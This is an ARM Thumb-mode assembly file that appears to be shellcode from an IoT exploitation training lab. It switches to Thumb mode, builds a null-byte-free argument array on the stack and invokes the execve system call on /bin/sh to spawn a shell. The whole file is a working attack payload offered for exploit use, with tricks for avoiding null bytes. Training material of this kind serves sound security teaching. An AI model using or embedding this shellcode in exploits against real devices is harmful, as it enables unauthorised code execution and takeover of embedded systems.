.section .text
.global _start

_start:
	adr	r1, THUMB+1
	bx 	r1

/* Shellcode used for @therealsaumil 's IoT exploitation lab training (offensivecon19) */

THUMB:
.code 16
	/* first argv set up: ref. to 1st byte of /bin/sh */
	adr 	r0, BINSH

	/* third argv set up */
	eor 	r2, r2, r2	/* mov 	r2, #0 */
	strb	r2, [r0, #7]	/* add null byte without null byte at r0+7 -> /bin/shX\0*/

	/* store data on stack*/
	push	{r0, r2}
	
	/* store arguments needed into r1 */
	mov r1, sp

	/* syscall + syscall trigger */
	mov 	r7, #11
	svc 	#1 	/* invoke syscall #1 works too and remove null byte */

.balign 4 

BINSH:
.ascii "/bin/shX"
